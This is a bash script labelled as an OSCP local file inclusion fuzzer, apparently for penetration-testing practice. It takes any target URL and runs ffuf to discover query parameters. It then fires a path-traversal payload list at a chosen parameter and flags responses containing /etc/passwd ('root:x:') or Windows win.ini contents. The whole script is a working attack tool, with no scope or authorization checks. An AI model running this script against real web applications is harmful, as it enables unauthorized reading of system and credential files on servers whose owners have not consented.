#!/bin/bash

# Usage
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 http://target/page.php"
    exit 1
fi

TARGET=$1

echo "=================================="
echo " OSCP LFI FUZZER "
echo " Target: $TARGET"
echo "=================================="

mkdir -p lfi_results

echo ""
echo "[+] Step 1: Finding parameters..."

ffuf -u "$TARGET?FUZZ=test" \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0 \
-o lfi_results/parameters.json

echo ""
echo "[+] Possible parameters saved to:"
echo "lfi_results/parameters.json"

echo ""
read -p "Enter parameter name to test for LFI: " PARAM

echo ""
echo "[+] Step 2: Fuzzing LFI payloads..."

ffuf -u "$TARGET?$PARAM=FUZZ" \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-mc all \
-o lfi_results/lfi_fuzz.json

echo ""
echo "[+] Step 3: Checking for /etc/passwd..."

ffuf -u "$TARGET?$PARAM=FUZZ" \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-mr "root:x:" \
-o lfi_results/passwd_hits.json

echo ""
echo "[+] Step 4: Checking Windows win.ini..."

ffuf -u "$TARGET?$PARAM=FUZZ" \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-mr "\[extensions\]" \
-o lfi_results/win_hits.json

echo ""
echo "=================================="
echo " Scan Complete "
echo " Results saved in lfi_results/"
echo "=================================="
